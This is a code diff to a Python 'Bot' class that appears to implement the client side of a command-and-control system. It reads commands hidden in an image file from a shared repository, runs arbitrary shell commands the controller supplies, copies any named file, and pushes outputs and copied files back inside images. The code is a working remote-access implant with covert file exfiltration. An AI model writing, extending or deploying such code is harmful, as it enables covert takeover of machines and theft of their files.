@@ -1,8 +1,9 @@
 import argparse
 import os
 import select
+import shlex
 import sys
-from typing import Optional, Any, Dict, Union
+from typing import Optional, Any, Dict, Union, List
 import random
 
 from terminal import gray, rst, cyan, magenta, yellow, green, red
@@ -68,22 +69,43 @@ class Bot(ParticipantBase):
         print(f'{green}Successfully terminated.{rst}')
         pass
 
-    def _get_command(self, control_data: None):
-        if self._name is None:
+    def _get_command(self) -> Any:
+        if not os.path.exists('comm/' + CONTROL_IMAGE):
             return None
+        control_data = decode_data('comm/' + CONTROL_IMAGE)
         if not isinstance(control_data, dict):
             return None
         if self._name not in control_data:
             return None
-        return control_data[self._name]
+        cmd = control_data[self._name]
+        if self._is_valid_command(cmd):
+            return cmd
+        return None
 
     @staticmethod
-    def _is_valid_command(cmd: Dict[str, Any]) -> bool:
-        # id: random string
-        # name: terminate|run|copy
-        # shell: bool
-        # cmd: str
-        # file_name: str
+    def _is_valid_command(data: Any) -> bool:
+        if not isinstance(data, dict):
+            return False
+        if 'id' not in data or 'name' not in data:
+            return False
+        if not isinstance(data['id'], str) or not isinstance(data['name'], str):
+            return False
+        if data['id'] == '':
+            return False
+        name = data['name']
+        if name == 'terminate':
+            return True
+        if name == 'run':
+            shell = data['shell'] if 'shell' in data else None
+            cmd = data['cmd'] if 'cmd' in data else None
+            if not isinstance(shell, bool) or not isinstance(cmd, str) or cmd == '':
+                return False
+            return True
+        if name == 'copy_from':
+            file_name = data['file_name'] if 'file_name' in data else None
+            if not isinstance(file_name, str) or file_name == '':
+                return False
+            return True
         return False
 
     def _generate_name(self) -> None:
@@ -104,6 +126,13 @@ class Bot(ParticipantBase):
             self._register()
         pass
 
+    def _get_additional_files_to_send(self) -> Optional[List[str]]:
+        if self._state['result'] is None:
+            return None
+        if 'files' not in self._state['result']:
+            return None
+        return self._state['result']['files']
+
     def _update_state(self) -> None:
         print(f'{gray}updating state ...{rst}')
 
@@ -111,22 +140,38 @@ class Bot(ParticipantBase):
 
         self._ensure_registration()
 
-        if os.path.exists('comm/' + CONTROL_IMAGE):
-            control_data = decode_data('comm/' + CONTROL_IMAGE)
-            cmd = self._get_command(control_data)
-            if cmd is not None and self._is_valid_command(cmd):
-                print('processing command')
+        cmd = self._get_command()
 
-        # TODO: commands processing
+        if cmd is not None:
+            print(f"{green}[NEW COMMAND]{rst} id={magenta}{cmd['id']}{rst} cmd: {cyan}{self._cmd_to_string(cmd)}{rst}")
+            if cmd['name'] == 'terminate':
+                self._handle_terminate_command(cmd)
+            elif cmd['name'] == 'run':
+                self._handle_run_command(cmd)
+            elif cmd['name'] == 'copy_from':
+                self._handle_copy_from_command(cmd)
+            else:
+                print(f'{red}no corresponding handle function, setting result to null{rst}')
+                self._state['result'] = None
+        else:
+            print(f'{gray}no valid command for this bot, setting result to null{rst}')
+            self._state['result'] = None
 
+        # update the bot image
         self._state['last_update'] = now_ms()
         encode_data(
             image_file='lib/' + self._image,
             data=self._state,
             output_file='comm/' + self._name,
+            additional_files_to_zip=self._get_additional_files_to_send(),
+            remove_additional_files_after_zip=True,
         )
         self._comm_client.add([self._name])
 
+        # commit and push all changes if needed
+        # note: there can only be one type of changes:
+        #   1. added/updated the bot image
+        #   (deleted bot image can happen only in self.destroy())
         self._comm_client.commit_and_push_if_needed()
 
         print(f"{gray}successful update on {green}{format_timestamp(self._state['last_update'])}{rst}")
@@ -135,14 +180,79 @@ class Bot(ParticipantBase):
 
     # COMMANDS
 
-    def _handle_terminate_command(self) -> None:
+    @staticmethod
+    def _cmd_to_string(cmd: Dict[str, Union[str, bool, int]]) -> str:
+        if cmd['name'] == 'terminate':
+            return 'terminate'
+        if cmd['name'] == 'copy_from':
+            return f"copy_from {cmd['file_name']}"
+        if cmd['name'] == 'run':
+            return f"shell={'True' if cmd['shell'] else 'False'} run {cmd['cmd']}"
+        return 'unknown command'
+
+    def _handle_terminate_command(self, cmd: Dict[str, Union[str, int, bool]]) -> None:
+        print(f'{green}handling terminate command using self.destroy(){rst}')
+        self.destroy()
+        exit(0)
         pass
 
-    def _handle_run_command(self, shell: bool, cmd: str) -> None:
+    def _handle_run_command(self, cmd: Dict[str, Union[str, int, bool]]) -> None:
+        print(f'{green}handling run command{rst}')
+
+        if cmd['shell']:
+            args = cmd['cmd']
+        else:
+            args = shlex.split(cmd['cmd'])
+
+        p = subprocess.run(
+            args=args,
+            shell=cmd['shell'],
+            capture_output=True,
+            # TODO: if the future, sent back raw bytes (as base64) to the controller
+            #       that way we can support non utf-8 stdout/stderr data
+            encoding='utf-8',
+        )
+
+        result = {
+            'id': cmd['id'],
+            'timestamp': now_ms(),
+            'exit_code': p.returncode,
+            'stdout': p.stdout,
+            'stderr': p.stderr,
+        }
+        self._state['result'] = result
+        print(f'{green}result set{rst}', result)
 
         pass
 
-    def _handle_copy_from_command(self, file_name: str) -> None:
+    def _handle_copy_from_command(self, cmd: Dict[str, Union[str, int, bool]]) -> None:
+        print(f'{green}handling copy_from command{rst}')
+
+        file_name = cmd['file_name']
+
+        transfer_name = f'{cmd["id"]}-{os.path.basename(file_name)}'
+
+        p = subprocess.run(
+            args=['cp', file_name, transfer_name],
+            capture_output=True,
+            encoding='utf-8',
+        )
+
+        result = {
+            'id': cmd['id'],
+            'timestamp': now_ms(),
+            'exit_code': p.returncode,
+            'stdout': p.stdout,
+            'stderr': p.stderr,
+        }
+
+        # only try to send the file if the cp actually succeeded
+        if os.path.isfile(transfer_name):
+            result['files'] = [transfer_name]
+
+        self._state['result'] = result
+        print(f'{green}result set{rst}', result)
+
         pass
 
 
